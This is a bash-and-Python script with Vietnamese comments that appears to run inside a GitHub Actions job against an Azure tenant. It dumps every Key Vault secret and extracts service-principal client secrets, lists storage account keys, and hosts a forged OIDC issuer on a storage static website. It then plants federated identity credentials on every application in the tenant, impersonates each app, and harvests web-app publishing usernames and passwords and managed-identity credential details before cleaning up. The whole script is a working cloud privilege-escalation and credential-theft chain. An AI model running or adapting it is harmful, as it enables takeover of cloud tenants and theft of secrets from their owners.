#!/usr/bin/env bash
# v18 — KIỂM CHỨNG giả thuyết hậu kiểm:
#   Giả thuyết: app-tbl-reporting-prod nằm ở rg-tbl-reporting-prod-eus (KHÔNG phải -sea).
#   v15 gọi sai RG nên publishxml "fail" — không phải do thiếu quyền.
#   Test: gọi publishxml + publishingcredentials/list + sites/read trên ĐÚNG path,
#         bằng 6 SP (client_secret) và 14 app (FIC). Cộng thêm liệt kê FIC của MI.
set +e
TEN="${AZURE_TENANT_ID}"; SUB="${AZURE_SUBSCRIPTION_ID}"
RG_SEA=rg-tbl-platform-prod-sea
RG_EUS=rg-tbl-reporting-prod-eus
SITE=app-tbl-reporting-prod
MI=id-tbl-reporting-writer
SA=sttblcilogsprodx3euoz; PROD=kv-tbl-prod-x3euoz
AUTO_APP=462d1c38-4459-48b8-9333-82e389e59514
HOST="https://$SA.z23.web.core.windows.net"
PFX="hx-$RANDOM$RANDOM"; SUBJECT="tbl-verify-htx"

gh_tok(){ curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])"; }
tok_fed(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d grant_type=client_credentials \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
tok_sp(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$1" -d "scope=$3" -d grant_type=client_credentials \
  --data-urlencode "client_secret=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }

GHTOK=$(gh_tok "api://AzureADTokenExchange")
KV=$(tok_fed "https://vault.azure.net/.default" "$GHTOK")
ARM_CI=$(tok_fed "https://management.azure.com/.default" "$GHTOK")
curl -sS -H "Authorization: Bearer $KV" "https://$PROD.vault.azure.net/secrets?api-version=7.4" > /tmp/l.json
: > /tmp/sps.txt
for ID in $(python3 -c "
import json;print('\n'.join(s['id'] for s in json.load(open('/tmp/l.json')).get('value',[])))"); do
  curl -sS -H "Authorization: Bearer $KV" "$ID?api-version=7.4" > /tmp/s.json
  python3 - "${ID##*/}" <<'PY' >> /tmp/sps.txt
import json,sys
try:
    v=json.loads(json.load(open("/tmp/s.json"))["value"])
    print(sys.argv[1], v.get("appId",""), v.get("clientSecret",""))
except Exception: pass
PY
done
ASEC=$(awk '$1=="sync-service-principal"{print $3}' /tmp/sps.txt)
G=$(tok_sp "$AUTO_APP" "$ASEC" "https://graph.microsoft.com/.default")
ARMA=$(tok_sp "$AUTO_APP" "$ASEC" "https://management.azure.com/.default")
KEY0=$(curl -sS -X POST -H "Authorization: Bearer $ARMA" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG_SEA/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
  | python3 -c "
import sys,json;print(json.load(sys.stdin)['keys'][0]['value'])")
curl -sS -H "Authorization: Bearer $G" \
  "https://graph.microsoft.com/v1.0/applications?\$top=100&\$select=id,appId,displayName" > /tmp/apps.json
echo "[*] prefix=$PFX graph=${#G} key=${#KEY0}"

echo "================ A. ĐỐI CHỨNG: cùng SP, hai RG ================"
for RGX in "$RG_SEA" "$RG_EUS"; do
  echo "--- RG=$RGX  site=$SITE (dùng ARM của tbl-platform-automation)"
  curl -sS -o /tmp/o -w '  http=%{http_code}\n' -X POST -H "Authorization: Bearer $ARMA" -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RGX/providers/Microsoft.Web/sites/$SITE/publishxml?api-version=2022-03-01"
  head -c 220 /tmp/o; echo
done

pip -q install azure-storage-blob pyjwt cryptography >/dev/null 2>&1
python3 - "$SA" "$KEY0" "$HOST" "$PFX" "$SUBJECT" "$TEN" "$SUB" "$RG_EUS" "$SITE" "$MI" "$G" <<'PY'
import sys,json,time,uuid,base64,urllib.request,urllib.parse,re
from azure.storage.blob import BlobServiceClient, ContentSettings
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import jwt
sa,key0,host,pfx,subject,ten,sub,rg,site,mi,graph = sys.argv[1:12]
ISS=f"{host}/{pfx}"; B="https://management.azure.com"
svc=BlobServiceClient(f"https://{sa}.blob.core.windows.net",credential=key0)
web=svc.get_container_client("$web")
priv=rsa.generate_private_key(public_exponent=65537,key_size=2048)
pn=priv.public_key().public_numbers()
b64u=lambda i: base64.urlsafe_b64encode(i.to_bytes((i.bit_length()+7)//8,'big')).decode().rstrip('=')
KID="k-"+uuid.uuid4().hex[:8]
PEM=priv.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.PKCS8,serialization.NoEncryption())
JS=json.dumps({"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":KID,"n":b64u(pn.n),"e":b64u(pn.e)}]})
CFG=json.dumps({"issuer":ISS,"jwks_uri":ISS+"/jwks.json","response_types_supported":["id_token"],
 "subject_types_supported":["public"],"id_token_signing_alg_values_supported":["RS256"]})
ct=ContentSettings(content_type="application/json")
for p,b in ((f"{pfx}/jwks.json",JS),(f"{pfx}/.well-known/jwks.json",JS),(f"{pfx}/.well-known/openid-configuration",CFG)):
    web.upload_blob(p,b,overwrite=True,content_settings=ct)

def api(url,method="GET",tok=graph,body=None,raw=False):
    d=json.dumps(body).encode() if body is not None else None
    r=urllib.request.Request(url,d,method=method,headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"})
    try:
        with urllib.request.urlopen(r,timeout=40) as f:
            t=f.read()
            return t.decode(errors="replace") if raw else (json.loads(t) if t else {})
    except Exception as e:
        try:
            body=e.read().decode(errors="replace")
            return ("ERR "+body[:160]) if raw else {"error":body[:160]}
        except Exception:
            return ("ERR "+str(e)[:90]) if raw else {"error":str(e)[:90]}
def mint():
    n=int(time.time())
    return jwt.encode({"iss":ISS,"sub":subject,"aud":"api://AzureADTokenExchange","iat":n-60,
      "nbf":n-60,"exp":n+900,"jti":uuid.uuid4().hex},PEM,algorithm="RS256",headers={"kid":KID})
def exchange(app,scope):
    d=urllib.parse.urlencode({"client_id":app,"scope":scope,"grant_type":"client_credentials",
      "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":mint()}).encode()
    try:
        with urllib.request.urlopen(urllib.request.Request(
          f"https://login.microsoftonline.com/{ten}/oauth2/v2.0/token",d),timeout=30) as f:
            return json.load(f).get("access_token","")
    except Exception: return ""

apps=json.load(open("/tmp/apps.json"))["value"]
created=[]
for a in apps:
    r=api(f"https://graph.microsoft.com/v1.0/applications/{a['id']}/federatedIdentityCredentials","POST",
          body={"name":"ver-"+pfx[:12],"issuer":ISS,"subject":subject,"audiences":["api://AzureADTokenExchange"]})
    if "error" not in r: created.append((a['id'],r.get("id"),a['appId'],a['displayName']))
print("[*] FIC tạm:",len(created)); time.sleep(45)

SITEBASE=f"{B}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Web/sites/{site}"
MIBASE=f"{B}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.ManagedIdentity/userAssignedIdentities/{mi}"
print("================ B. publishxml / publishingcredentials trên RG ĐÚNG ================")
hits=[]
for oid,fid,appid,name in created:
    am=exchange(appid,B+"/.default")
    if not am: continue
    rd=api(SITEBASE+"?api-version=2022-03-01",tok=am)
    px=api(SITEBASE+"/publishxml?api-version=2022-03-01","POST",tok=am,body={},raw=True)
    pc=api(SITEBASE+"/config/publishingcredentials/list?api-version=2022-03-01","POST",tok=am,body={})
    fx=api(MIBASE+"/federatedIdentityCredentials?api-version=2023-01-31",tok=am)
    ok_read = "error" not in rd
    ok_px   = isinstance(px,str) and "userName" in px
    ok_pc   = "error" not in pc
    ok_fx   = "error" not in fx
    if ok_read or ok_px or ok_pc or ok_fx:
        print(f"  >>> {name} ({appid}) read={ok_read} publishxml={ok_px} pubcreds={ok_pc} miFIC={ok_fx}")
        hits.append((name,appid,px,pc,fx))
    else:
        print(f"      {name}: tất cả denied")
if not hits: print("  [!] không danh tính nào chạm được resource ở RG này")

print("================ C. chi tiết ================")
for name,appid,px,pc,fx in hits:
    print(f"-- {name}")
    if isinstance(px,str) and "userName" in px:
        m=re.search(r'userName="([^"]+)"[^>]*userPWD="([^"]+)"',px)
        print("   publishxml user =", m.group(1) if m else "?")
    if isinstance(pc,dict) and "error" not in pc:
        p=pc.get("properties",pc)
        print("   pubcreds user =", p.get("publishingUserName"), "scm =", p.get("scmUri","")[:60])
    if isinstance(fx,dict) and "error" not in fx:
        for f in fx.get("value",[]):
            pr=f.get("properties",f)
            print("   MI-FIC:",f.get("name"),"| iss=",pr.get("issuer"),"| sub=",pr.get("subject"),"| aud=",pr.get("audiences"))

print("[*] dọn dẹp")
for oid,fid,appid,name in created:
    if fid: api(f"https://graph.microsoft.com/v1.0/applications/{oid}/federatedIdentityCredentials/{fid}","DELETE")
for p in (f"{pfx}/jwks.json",f"{pfx}/.well-known/jwks.json",f"{pfx}/.well-known/openid-configuration"):
    try: web.delete_blob(p)
    except Exception: pass
PY
echo "================ DONE ================"
